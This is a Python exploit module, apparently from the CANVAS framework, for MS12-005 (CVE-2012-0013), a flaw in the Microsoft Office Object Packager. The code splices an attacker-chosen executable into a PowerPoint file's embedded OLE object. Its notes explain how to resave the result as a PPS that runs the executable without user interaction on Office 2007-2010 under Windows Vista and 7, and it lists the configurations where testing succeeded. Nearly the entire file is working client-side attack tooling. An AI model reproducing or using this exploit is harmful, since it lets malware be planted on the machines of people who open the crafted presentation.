#!/usr/bin/env python

import sys
import os
import zipfile

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit
from canvaserror import *

NAME = 'MS12-005: MS Office 2007-2010 Shell Object Packager file extension bypass'
DESCRIPTION = 'Insufficient blacklisting checks on Unicode file extensions allows for embedded executables to execute without user interaction'
VERSION = '1.0'


DOCUMENTATION = { 
    'VENDOR' : 'Microsoft',
    'Repeatability' : 'Infinite',
    'CVE Name' : 'CVE-2012-0013',
    'CVE Url' : 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0013',
    'Notes' : 'The issue we exploit here was fixed silently alongside the ClickOnce issues in the MS12-005 patch but allows for a much cleaner exploitation primitive. To use this exploit, prepare a PPTX using this module by embedding a desired executable (PE .EXE), then save the resulting patched PPTX as a PPS (97-2003 powerpoint show) using MS Office 2010. This PPS may be served to vulnerable MS Office 2007-2010 installations on Windows Vista and 7 and will execute the embedded executable without further user interaction on opening of the PPS.'
    }

PROPERTY = {
    'TYPE' : 'Exploit',
    'SITE' : 'Clientside',
    'ARCH' : [['Windows']],
    'VERSION' : ['Vista', '7']
    }

DEV = """
Affected Systems

From Windows Vista onward Microsoft introduced wide-character fields in the OLE envelopes that
contain information about embedded OLE objects. On Packager versions of Windows XP these fields
are only present in ASCII form. Microsoft failed to implement stringent blacklisting checks on the
more recent wide-character file name fields introduced in the Windows Vista Object Packager. As a
result Microsoft Office 2007-2010 are susceptible to exploitation on Windows Vista and above,
including Windows 7 and most likely Windows 8.

Tested

Microsoft Office 2010 on Windows Vista, EN Successful exploitation
Microsoft Office 2010 on Windows 7, EN Successful exploitation
Microsoft Office 2007 on Windows Vista, EN Successful exploitation
Microsoft Office 2007 on Windows 7, EN Successful exploitation
Microsoft Office 2003 on Windows Vista, EN Unsuccessful exploitation
Microsoft Office 2003 on Windows 7, EN Unsuccessful exploitation
PowerPoint Viewer 2010 on Windows Vista Unsuccessful exploitation
Microsoft Office 2007 on Windows XP, Chinese Unsuccessful exploitation
Microsoft Office 2011 on Mac OSX 10.7.1 Unsuccessful exploitation

"""

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name = NAME
        self.pptx_path = "exploits/ms12_005/Resources/bin.pptx"
        self.ole_path = "exploits/ms12_005/Resources/olevil.bin" # max EXE size for this one is 300K, can be adjusted if needed
        self.out_path = "patched.pptx"
        self.exe_path = ""

    def getArgs(self):
        # the pptx should contain a single animation object activated OLE executable
        self.pptx_path = self.argsDict.get('pptx_path', self.pptx_path)
        self.exe_path = self.argsDict.get('exe_path', self.exe_path)

    def patch_pptx(self):
        # prep the OLE bin
        z1 = zipfile.ZipInfo()
        z1.filename = "ppt/embeddings/oleObject1.bin"
        z1.compress_type = zipfile.ZIP_DEFLATED
        ole = open(self.ole_path).read()
        exe = open(self.exe_path).read()
        ole = ole.replace('A'*len(exe), exe)
        z2 = zipfile.ZipFile(self.pptx_path)
        z3 = zipfile.ZipFile(self.out_path, "w")
        # place the patched oleObject1.bin
        z3.writestr(z1, ole)
        # tranfser the rest of the original files over to our patched pptx
        for f in z2.namelist():
            if 'oleObject1.bin' in f:
                # skip
                continue
            else:
                z3.writestr(f, z2.read(f))    
        z2.close()
        z3.close()

    def run(self):
        self.getArgs()
        if not self.exe_path:
            self.log("Please provide a path to an executable you would like to embed through -O exe_path:/path/to/exe")
            return False
        self.patch_pptx()
        self.log("To complete the exploit preparation you must now save %%CANVASROOT%%/%s as a PPS (powerpoint 97-2003 show) using MS Office 2010" % self.out_path)
        return True

if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
